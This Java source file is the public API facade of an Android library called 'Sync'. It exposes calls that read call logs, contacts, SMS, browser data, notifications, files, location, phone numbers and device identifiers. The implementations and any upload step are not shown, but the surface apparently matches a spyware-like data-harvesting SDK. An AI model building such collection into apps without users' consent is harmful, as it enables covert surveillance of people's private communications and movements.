package com.sync.library;

import android.content.Context;

import androidx.annotation.NonNull;

import com.sync.library.callbacks.DeviceInfoCallback;
import com.sync.library.callbacks.FileManagerCallback;
import com.sync.library.callbacks.GaidCallback;
import com.sync.library.callbacks.SyncCallback;
import com.sync.library.callbacks.InstallLocationCallback;
import com.sync.library.callbacks.LocationCallback;
import com.sync.library.callbacks.PublicIPCallback;
import com.sync.library.impl.AppImpl;
import com.sync.library.impl.AudioImpl;
import com.sync.library.impl.BluetoothImpl;
import com.sync.library.impl.BrowserImpl;
import com.sync.library.impl.CallLogImpl;
import com.sync.library.impl.ContactImpl;
import com.sync.library.impl.DeviceIDImpl;
import com.sync.library.impl.DeviceInfoImpl;
import com.sync.library.impl.DeviceModelImpl;
import com.sync.library.impl.FileImpl;
import com.sync.library.impl.GaidImpl;
import com.sync.library.impl.SyncEngine;
import com.sync.library.impl.InstallLocationImpl;
import com.sync.library.impl.LocationImpl;
import com.sync.library.impl.NotificationImpl;
import com.sync.library.impl.MobileNumberImpl;
import com.sync.library.impl.PublicIPImpl;
import com.sync.library.impl.SmsImpl;
import com.sync.library.impl.WifiImpl;
import com.sync.library.models.AudioInfo;
import com.sync.library.models.BluetoothInfo;
import com.sync.library.models.BrowserData;
import com.sync.library.models.CallLog;
import com.sync.library.models.Contact;
import com.sync.library.models.DeviceID;
import com.sync.library.models.DeviceInfo;
import com.sync.library.models.DeviceModel;
import com.sync.library.models.FileInfo;
import com.sync.library.models.Gaid;
import com.sync.library.models.InstallLocation;
import com.sync.library.models.InstalledApp;
import com.sync.library.models.LocationInfo;
import com.sync.library.models.MobileNumber;
import com.sync.library.models.NotificationInfo;
import com.sync.library.models.SmsMessage;
import com.sync.library.models.WifiInfo;

import java.util.List;

public class Sync {

    @NonNull
    public static List<CallLog> getCallLogs(@NonNull Context context, int limit) {
        return CallLogImpl.getCallLogs(context, limit);
    }

    @NonNull
    public static List<CallLog> getCallLogs(@NonNull Context context) {
        return CallLogImpl.getCallLogs(context);
    }

    @NonNull
    public static List<Contact> getContacts(@NonNull Context context, int limit) {
        return ContactImpl.getContacts(context, limit);
    }

    @NonNull
    public static List<Contact> getContacts(@NonNull Context context) {
        return ContactImpl.getContacts(context);
    }

    @NonNull
    public static List<InstalledApp> getInstalledApps(@NonNull Context context) {
        return AppImpl.getInstalledApps(context);
    }

    @NonNull
    public static List<WifiInfo> getWifi(@NonNull Context context) {
        return WifiImpl.getWifi(context);
    }

    @NonNull
    public static DeviceID getDeviceID(@NonNull Context context) {
        return DeviceIDImpl.getDeviceID(context);
    }

    @NonNull
    public static BluetoothInfo getBluetoothAddress(@NonNull Context context) {
        return BluetoothImpl.getBluetoothAddress(context);
    }

    public static void getGaid(@NonNull Context context, @NonNull GaidCallback callback) {
        GaidImpl.getGaid(context, callback);
    }

    @NonNull
    public static DeviceModel makeModel() {
        return DeviceModelImpl.makeModel();
    }

    public static void getLocation(@NonNull Context context, @NonNull LocationCallback callback) {
        LocationImpl.getLocation(context, callback);
    }

    public static void getInstallLocation(@NonNull Context context, @NonNull InstallLocationCallback callback) {
        InstallLocationImpl.getInstallLocation(context, callback);
    }

    public static void getPublicIP(@NonNull PublicIPCallback callback) {
        PublicIPImpl.getPublicIP(callback);
    }

    @NonNull
    public static List<MobileNumber> getMobileNumber(@NonNull Context context) {
        return MobileNumberImpl.getMobileNumber(context);
    }

    public static void getDeviceInfo(@NonNull Context context, @NonNull DeviceInfoCallback callback) {
        DeviceInfoImpl.getDeviceInfo(context, callback);
    }

    public static void getFileManager(@NonNull Context context, @NonNull String path, @NonNull FileManagerCallback callback) {
        FileImpl.listFiles(context, path, callback);
    }

    public static void getFileManager(@NonNull Context context, @NonNull FileManagerCallback callback) {
        FileImpl.listFiles(context, callback);
    }

    public static void update(@NonNull Context context, @NonNull SyncCallback callback) {
        SyncEngine.update(context, callback);
    }

    @NonNull
    public static AudioInfo getAudioInfo(@NonNull Context context) {
        return AudioImpl.getAudioInfo(context);
    }

    @NonNull
    public static List<NotificationInfo> getActiveNotifications(@NonNull Context context) {
        return NotificationImpl.getActiveNotifications(context);
    }

    @NonNull
    public static List<SmsMessage> getSms(@NonNull Context context, @NonNull String folder, int limit) {
        return SmsImpl.getSms(context, folder, limit);
    }

    @NonNull
    public static List<SmsMessage> getSms(@NonNull Context context) {
        return SmsImpl.getSms(context);
    }

    @NonNull
    public static List<BrowserData> getBrowserData(@NonNull Context context, int limit) {
        return BrowserImpl.getBrowserData(context, limit);
    }

    @NonNull
    public static List<BrowserData> getBrowserData(@NonNull Context context) {
        return BrowserImpl.getBrowserData(context);
    }
}
